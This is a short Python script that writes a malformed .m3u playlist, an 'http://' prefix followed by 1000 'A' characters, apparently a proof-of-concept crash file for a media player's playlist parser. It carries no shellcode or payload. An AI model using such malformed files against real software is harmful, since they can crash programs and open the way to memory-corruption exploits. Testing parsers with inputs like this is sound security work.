#!/usr/bin/python

buff = "http:// "
buff += "A" * 1000

fo = open("foo.m3u", "wb")
fo.write (buff)
fo.close()